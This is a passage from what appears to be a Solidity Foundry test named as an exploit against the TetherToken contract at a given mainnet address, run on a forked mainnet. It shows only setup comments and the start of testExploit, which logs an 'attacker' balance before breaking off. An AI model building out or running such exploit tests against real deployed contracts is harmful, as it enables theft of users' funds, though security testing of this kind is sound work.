    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we're using a forked mainnet environment
        // The TARGET contract is already deployed at 0xdAC17F958D2ee523a2206206994597C13D831ec7
        // We'll just create an interface to interact with it
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Create interface for TetherToken
        ITetherToken target = ITetherToken(TARGET);

        // Get attacker's initial balance
        uint256 initialBalance = target.balanceOf(attacker);
        console.log("Initial attacker balance:", initialBalance);

        // Get current owner for reference
